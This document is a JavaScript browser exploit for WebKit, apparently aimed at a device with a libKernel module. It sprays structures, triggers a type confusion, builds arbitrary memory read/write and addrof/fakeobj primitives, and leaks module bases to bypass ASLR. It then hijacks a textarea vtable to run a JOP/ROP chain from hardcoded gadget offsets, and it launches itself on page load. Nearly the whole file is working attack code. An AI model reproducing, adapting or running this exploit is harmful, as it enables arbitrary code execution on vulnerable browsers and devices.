debug_log("starting");
window.onerror = function myErrorHandler(errorMsg, url, lineNumber) {
    debug_log("Error occured " + url + ":" + lineNumber + ":\n" + errorMsg);//or any message
    return false;
}

var STRUCTURE_SPRAY_SIZE = 0x1800;

var g_confuse_obj = null;
var g_arb_master = null;
var g_arb_slave = new Uint8Array(0x2000);
var g_leaker = {};
var g_leaker_addr = null;
var g_structure_spray = [];

var dub = new Int64(0x41414141, 0x41414141).asDouble();
var g_inline_obj = {
    a: dub,
    b: dub,
};

function spray_structs() {
    for (var i = 0; i < STRUCTURE_SPRAY_SIZE; i++) {
        var a = new Uint32Array(0x1)
        a["p" + i] = 0x1337;
        g_structure_spray.push(a); // keep the Structure objects alive.
    }

}

function trigger() {

    var o = {
        'a': 1
    };

    var test = new ArrayBuffer(0x100000);
    g_confuse_obj = {};

    var cell = {
        js_cell_header: new Int64([
            0x00, 0x8, 0x00, 0x00, // m_structureID, current guess
            0x0, // m_indexingType
            0x27, // m_type, Float64Array
            0x18, // m_flags, OverridesGetOwnPropertySlot |
            // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
            0x1 // m_cellState, NewWhite
        ]).asJSValue(),
        butterfly: false, // Some arbitrary value
        vector: g_inline_obj,
        len_and_flags: (new Int64('0x0001000100000020')).asJSValue()
    };

    g_confuse_obj[0 + "a"] = cell;

    g_confuse_obj[1 + "a"] = {};
    g_confuse_obj[1 + "b"] = {};
    g_confuse_obj[1 + "c"] = {};
    g_confuse_obj[1 + "d"] = {};


    for (var j = 0x5; j < 0x20; j++) {
        g_confuse_obj[j + "a"] = new Uint32Array(test);
    }

    for (var k in o) {
        {
            k = {
                a: g_confuse_obj,
                b: new ArrayBuffer(test.buffer),
                c: new ArrayBuffer(test.buffer),
                d: new ArrayBuffer(test.buffer),
                e: new ArrayBuffer(test.buffer),
                1: new ArrayBuffer(test.buffer),

            };

            function k() {
                return k;
            }

        }

        o[k];

        if (g_confuse_obj["0a"] instanceof Uint32Array) {
            return;
        }
    }
}

function setup_arb_rw() {
    var jsCellHeader = new Int64([
        0x00, 0x08, 0x00, 0x00, // m_structureID, current guess
        0x0, // m_indexingType
        0x27, // m_type, Float64Array
        0x18, // m_flags, OverridesGetOwnPropertySlot |
        // InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
        0x1 // m_cellState, NewWhite
    ]);
    g_fake_container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false, // Some arbitrary value
        vector: g_arb_slave,
        lengthAndFlags: (new Int64('0x0001000000000020')).asJSValue()
    };

    g_inline_obj.a = g_fake_container;
    g_confuse_obj["0a"][0x4] += 0x10;
    g_arb_master = g_inline_obj.a;
    g_arb_master[0x6] = 0xFFFFFFF0;
}

function read(addr, length) {
    if (!(addr instanceof Int64))
        addr = new Int64(addr);

    g_arb_master[4] = addr.low32();
    g_arb_master[5] = addr.hi32();

    var a = new Array(length);

    for (var i = 0; i < length; i++)
        a[i] = g_arb_slave[i];
    return a;
}

function read8(addr) {
    return read(addr, 1)[0];
}

function read16(addr) {
    return Struct.unpack(Struct.int16, read(addr, 2));
}

function read32(addr) {
    return Struct.unpack(Struct.int32, read(addr, 4));
}

function read64(addr) {
    return new Int64(read(addr, 8));
}

function readstr(addr) {
    if (!(addr instanceof Int64))
        addr = new Int64(addr);
    g_arb_master[4] = addr.low32();
    g_arb_master[5] = addr.hi32();
    var a = [];
    for (var i = 0;; i++) {
        if (g_arb_slave[i] == 0) {
            break;
        }
        a[i] = g_arb_slave[i];
    }
    return String.fromCharCode.apply(null, a);
}

function write(addr, data) {
    if (!(addr instanceof Int64))
        addr = new Int64(addr);
    g_arb_master[4] = addr.low32();
    g_arb_master[5] = addr.hi32();
    for (var i = 0; i < data.length; i++)
        g_arb_slave[i] = data[i];
}

function write8(addr, val) {
    write(addr, [val]);
}

function write16(addr, val) {
    write(addr, Struct.pack(Struct.int16, val));
}


function write32(addr, val) {
    write(addr, Struct.pack(Struct.int32, val));
}

function write64(addr, val) {
    if (!(val instanceof Int64))
        val = new Int64(val);
    write(addr, val.bytes());
}

function writestr(addr, str) {
    if (!(addr instanceof Int64))
        addr = new Int64(addr);
    g_arb_master[4] = addr.low32();
    g_arb_master[5] = addr.hi32();
    for (var i = 0; i < str.length; i++)
        g_arb_slave[i] = str.charCodeAt(i);
    g_arb_slave[str.length] = 0; // null character
}


function setup_obj_leaks() {
    g_leaker.leak = false;
    g_inline_obj.a = g_leaker;
    g_leaker_addr = new Int64(g_confuse_obj["0a"][4], g_confuse_obj["0a"][5]).add(0x10);
    debug_log("obj_leaker address @ " + g_leaker_addr);
}

function addrof(obj) {
    g_leaker.leak = obj;
    return read64(g_leaker_addr);
}

function fakeobj(addr) {
    write64(g_leaker_addr, addr);
    return g_leaker.leak;
}

function typed_array_buf_addr(typed_array) {
    return read64(addrof(typed_array).add(0x10));
}

function cleanup() {
    var u32array = new Uint32Array(8);
    header = read(addrof(u32array), 0x10);
    write(addrof(g_arb_master), header);
    write(addrof(g_confuse_obj['0a']), header);

    // Set length to 0x10 and flags to 0x1
    // Will behave as OversizeTypedArray which can survive gc easily
    write32(addrof(g_arb_master).add(0x18), 0x10);
    write32(addrof(g_arb_master).add(0x1C), 0x1); //
    write32(addrof(g_confuse_obj['0a']).add(0x18), 0x10);
    write32(addrof(g_confuse_obj['0a']).add(0x1C), 0x1);
    write32(addrof(g_arb_slave).add(0x1C), 0x1);

    var empty = {};
    header = read(addrof(empty), 0x8);
    write(addrof(g_fake_container), header);
}

window.nogc = [];

function malloc(size) {
    var backing = new Uint8Array(size);
    window.nogc.push(backing);
    
    backing.addr = read64(addrof(backing).add(0x10));
    return backing
}

function start_exploit() {
    /* 
     * Fire30's excellent webkit exploit
     */
    debug_log("Spraying Structures...");
    spray_structs();
    debug_log("Structures sprayed!");
    debug_log("Triggering bug...");
    trigger();
    debug_log("Bug successfully triggered!");
    debug_log("Crafting fake array for arbitrary read and write...");
    setup_arb_rw();
    debug_log("Array crafted!");
    debug_log("Setting up arbitrary object leaks...");
    setup_obj_leaks();
    debug_log("Arbitrary object leaks achieved!");
    debug_log("Cleaning up corrupted structures...");
    cleanup();
    debug_log("Cleanup done!");
    debug_log("Starting post exploitation...");

    /*
     * Create a textarea element and read out the first entry in its vtable.
     * This gives a pointer in the webkit module to that can be used to
     * find the base of the webkit module and thus break ASLR
     */
    var textArea = document.createElement("textarea");
    var textAreaJsObj = read64(addrof(textArea).add(0x18));
    var vtableAddr = read64(textAreaJsObj);
    debug_log("vtable @ " + vtableAddr)

    /*
     * Offset between the textarea vtable and webkit base is constant.
     * The offset was found by reading memory backwards from the vtable
     * until a crash occurred.
     */
    webkitBase = vtableAddr.sub(0x24a5c08);
    // page align the address
    webkitBase = webkitBase.sub(webkitBase.low32() & 0x3fff);
    debug_log("webkit base @ " + webkitBase);
    
    // returns the addresss that a 0xff 0x25 jmp instruction will jump to
    var get_jmptgt = function (addr, stuff)
    {
        var z = read16(addr);
        var y = read32(addr.add(2));
        if (z != 0x25ff)
        {
            return 0;
        }
        if(stuff)
        {
            y += 0x10;
        }
        return read64(addr.add(y + 6));
    };
    
    /*
     * At offset 0xC8 in the webkit module there is a jmp instruction
     * that jumps into the libKernel module.
     * Same as before, this jmp target can be used to calculate the base
     * of the libKernel module and break ASLR once again.
     */
    var libKernel = get_jmptgt(webkitBase.add(0xc8));
    libKernel = libKernel.sub(0x2bde0);
    libKernel = libKernel.sub(libKernel.low32() & 0x3fff);
    debug_log("libKernel base @ " + libKernel);

    /*
     * Same concept as libKernel but with offset 0xE8 and the libc module.
     */
    var libcBase = get_jmptgt(webkitBase.add(0xe8), true);
    libcBase = libcBase.sub(0xb61a0);
    libcBase = libcBase.sub(libcBase.low32() & 0x3fff);
    debug_log("libc base @ " + libcBase);

    /*
     * Now that we have some leaked addresses to work with we can start getting
     * code execution.
     */
    
    /*
     * Create a buffer of memory that we fully control to copy over the original
     * textarea vtable. The function pointers stored in the vtable aren't
     * in writable memory so we must make a fake vtable in read/write memory
     * which can be pointed to by the vtable pointer in the textarea object.
     */
    var vtableSize = 0x6E8 / 4;
    var fakeVtable = new Uint32Array(vtableSize);
    // 0x10 bytes into the Uint32Array object is where the raw integers are stored,
    // effectively giving us an allocated buffer of memory to work with.
    var fakeVtableAddr = read64(addrof(fakeVtable).add(0x10));

    /*
     * Copy over the original vtable's entries.
     */
    for(var i = 0; i < vtableSize; i++)
    {
        fakeVtable[i] = read32(vtableAddr.add(i * 4));
    }
    
    var infGadget = webkitBase.add(0xb9d08);

    var setjmpGadget = libcBase.add(0xc06cc);
    var longjmpGadget = libcBase.add(0xc0748);

    var firstJopGadget = webkitBase.add(0x6ace4f);
    var secondJopGadget = webkitBase.add(0x15c0f13);
    var thirdJopGadget = webkitBase.add(0x16cb42);

    var retGadget = libcBase.add(0xc0774);
    
    window.launchrop = function(chain) {
        var context = malloc(0x100);

        fakeVtable[0x77] = setjmpGadget.hi32();
        fakeVtable[0x76] = setjmpGadget.low32();
    
        write64(textAreaJsObj, fakeVtableAddr);
        
        textArea.scrollLeft = 0;
        
        for(var i = 0; i < 0x100; i += 8)
        {
            write64(context.addr.add(i), read64(textAreaJsObj.add(i)));
        }
        
        write64(textAreaJsObj, fakeVtableAddr);

        var jopBuffer = malloc(0x1000);
        var longjmpBuffer = malloc(0x1000);
        
        fakeVtable[0x77] = firstJopGadget.hi32();
        fakeVtable[0x76] = firstJopGadget.low32();
        write64(jopBuffer.addr, secondJopGadget);
        write64(jopBuffer.addr.add(0x8), thirdJopGadget);
        write64(jopBuffer.addr.add(0x70), longjmpGadget);
        
        var rdi = textAreaJsObj;
        write64(rdi.add(0x6f8), jopBuffer.addr);
        write64(rdi.add(0x60), longjmpBuffer.addr);
        
        for(var i = 0; i < 0x40; i += 8)
        {
            write64(longjmpBuffer.addr.add(i), read64(context.addr.add(i)));
        }
        
        var ropBuffer = malloc(0x1000);
        write64(ropBuffer.addr.add(0x8), infGadget);

        write64(longjmpBuffer.addr, retGadget);
        write64(longjmpBuffer.addr.add(0x10), ropBuffer.addr);

        textArea.scrollLeft = 0;
        
        write64(textAreaJsObj, vtableAddr);
    }

    launchrop();
    
    /*
    webkit base: 0000000817B48000   
    
    seg000:00000008181F4E4F 48 8B 87 F8 06 00 00   mov     rax, [rdi+6F8h]
    seg000:00000008181F4E56 FF 10                  call    qword ptr [rax]

seg000:0000000819108F13 48 8B 5F 60            mov     rbx, [rdi+60h]
seg000:0000000819108F17 FF 50 08               call    qword ptr [rax+8]

seg000:0000000817CB4B42 48 89 DA               mov     rdx, rbx
seg000:0000000817CB4B45 FF 50 70               call    qword ptr [rax+70h]

    libc base: 000000083DD64000 

seg000:000000083DE24748 48 8B 0A               mov     rcx, [rdx]
seg000:000000083DE2474B 48 8B 5A 08            mov     rbx, [rdx+8]
seg000:000000083DE2474F 48 8B 62 10            mov     rsp, [rdx+10h]
seg000:000000083DE24753 48 8B 6A 18            mov     rbp, [rdx+18h]
seg000:000000083DE24757 4C 8B 62 20            mov     r12, [rdx+20h]
seg000:000000083DE2475B 4C 8B 6A 28            mov     r13, [rdx+28h]
seg000:000000083DE2475F 4C 8B 72 30            mov     r14, [rdx+30h]
seg000:000000083DE24763 4C 8B 7A 38            mov     r15, [rdx+38h]
seg000:000000083DE24767 D9 6A 40               fldcw   word ptr [rdx+40h]
seg000:000000083DE2476A 85 C0                  test    eax, eax
seg000:000000083DE2476C 75 02                  jnz     short loc_83DE24770
seg000:000000083DE2476E FF C0                  inc     eax
seg000:000000083DE24770 48 89 0C 24            mov     [rsp], rcx
seg000:000000083DE24774 C3                     retn

seg000:000000083DE246CC 48 89 F9               mov     rcx, rdi
seg000:000000083DE246CF 48 8B 14 24            mov     rdx, qword ptr [rsp+40h+var_40]
seg000:000000083DE246D3 48 89 11               mov     [rcx], rdx
seg000:000000083DE246D6 48 89 59 08            mov     [rcx+8], rbx
seg000:000000083DE246DA 48 89 61 10            mov     [rcx+10h], rsp
seg000:000000083DE246DE 48 89 69 18            mov     [rcx+18h], rbp
seg000:000000083DE246E2 4C 89 61 20            mov     [rcx+20h], r12
seg000:000000083DE246E6 4C 89 69 28            mov     [rcx+28h], r13
seg000:000000083DE246EA 4C 89 71 30            mov     [rcx+30h], r14
seg000:000000083DE246EE 4C 89 79 38            mov     [rcx+38h], r15
seg000:000000083DE246F2 D9 79 40               fnstcw  word ptr [rcx+40h]
seg000:000000083DE246F5 0F AE 59 44            stmxcsr dword ptr [rcx+44h]
seg000:000000083DE246F9 48 31 C0               xor     rax, rax
seg000:000000083DE246FC C3                     retn
    */
}

start_exploit();
